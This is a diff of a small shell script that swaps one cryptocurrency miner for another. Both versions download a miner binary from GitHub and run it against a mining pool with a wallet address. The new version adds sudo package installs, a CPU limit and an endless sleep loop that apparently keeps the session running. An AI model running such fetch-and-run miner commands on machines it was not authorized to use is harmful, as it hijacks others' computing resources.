@@ -1,2 +1,12 @@
-#!/bin/bash
-wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04 && chmod +x ccminer_3_7_ubuntu_18.04 && ./ccminer_3_7_ubuntu_18.04 -a verus  -o stratum+tcp://verushash.mine.zergpool.com:3300 -u DF9BANQv5kZqKyNSAenkjx33dXhtBUnjjr.RING1 -p c=DOGE -t 6
+#!/bin/sh
+sudo apt update
+sudo apt install screen -y
+sudo apt install cpulimit -y
+cpulimit -P hellminer -l 100 -b |
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u R9LpRWVXVJhhmBctpKHvWvDc9x1hWXwXNv -p x --cpu 85
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
